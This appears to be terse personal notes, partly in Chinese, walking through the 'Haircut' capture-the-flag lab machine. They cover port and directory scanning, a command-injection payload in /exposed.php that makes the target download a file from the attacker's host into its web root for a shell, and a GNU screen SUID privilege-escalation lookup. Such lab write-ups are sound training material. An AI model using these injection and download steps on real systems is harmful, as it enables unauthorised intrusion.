
# Haircut

``` 
nmap -sC -sV oA nmap/haircut 10.10.10.24

apt install golang
go run main.go
export GOPATH=/root/go
go get github.com/satori/go.uuid
go get golang.org/x/crypto/ssh/terminal
go run main.go
go build
./gobuster -u 10.10.10.24 -l -w /usr/share/wordlists/dirbuster/directory.txt -x php -t 20
```
发现/exposed.php路径, cmd注入
``` 
-o /var/www/html/uploads http://10.10.14.13:8000/test.html&submit=Go
# 访问 http://10.10.10.24/uploads
# getshell

> find / -perm -4000 2>/dev/null | xargs ls -la
> screen -version
> ...执行linux/local/41152.txt的内容

searchsploit screen
searchsploit -x  linux/local/41152.txt

```

